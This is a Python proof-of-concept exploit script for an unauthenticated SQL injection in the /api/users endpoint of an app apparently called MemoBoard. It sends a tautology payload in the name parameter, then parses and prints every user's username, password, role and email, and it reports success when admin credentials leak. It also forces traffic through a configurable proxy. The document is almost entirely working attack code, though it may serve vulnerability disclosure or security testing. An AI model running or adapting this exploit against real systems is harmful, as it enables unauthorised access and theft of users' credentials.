#!/usr/bin/env python3
"""PoC: MemoBoard unauthenticated SQL injection on GET /api/users?name=

Dumps all users' passwords (including admin) via boolean-based injection.
"""
import argparse
import json
import os
import urllib.request
import urllib.parse


def never_bypass(host, **kwargs):
    return False


def opener(proxy: str):
    if not proxy:
        return urllib.request.build_opener()
    os.environ["no_proxy"] = ""
    os.environ["NO_PROXY"] = ""
    urllib.request.proxy_bypass = never_bypass
    if hasattr(urllib.request, "proxy_bypass_environment"):
        urllib.request.proxy_bypass_environment = never_bypass
    if hasattr(urllib.request, "proxy_bypass_registry"):
        urllib.request.proxy_bypass_registry = never_bypass
    handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
    return urllib.request.build_opener(handler)


def main() -> int:
    p = argparse.ArgumentParser(description="MemoBoard SQLi PoC")
    p.add_argument("-u", "--url", required=True, help="Target origin, e.g. http://127.0.0.1:5000")
    p.add_argument("--proxy", default="", help="HTTP proxy, e.g. http://127.0.0.1:8080; empty=direct")
    p.add_argument("--payload", default="' OR 1=1 --", help="SQLi payload for name param")
    args = p.parse_args()

    base = args.url.rstrip("/")
    http = opener(args.proxy)

    # Step 1: Dump all users including passwords via SQLi
    params = urllib.parse.urlencode({"name": args.payload})
    url = f"{base}/api/users?{params}"
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    print(f"[*] Request: GET {url}")
    try:
        resp = http.open(req, timeout=15)
        status = resp.status
        body = resp.read().decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        status = e.code
        body = e.read().decode("utf-8", errors="replace")
    except Exception as e:
        print(f"[!] Error: {e}")
        return 1

    print(f"[*] HTTP Status: {status}")
    print(f"[*] Response Body:")
    print(body)

    # Parse and display extracted credentials
    try:
        data = json.loads(body)
        users = data.get("users", [])
        print(f"\n[+] Extracted {len(users)} user record(s) with passwords:")
        for u in users:
            print(f"    - username={u.get('name')}, password={u.get('password')}, role={u.get('role')}, email={u.get('email')}")
        admin_found = any(u.get("role") == "admin" for u in users)
        if admin_found:
            print("\n[+] SUCCESS: Admin credentials leaked via unauthenticated SQL injection.")
            return 0
        else:
            print("\n[-] Admin record not found in results.")
            return 1
    except json.JSONDecodeError:
        print("\n[!] Response is not valid JSON.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
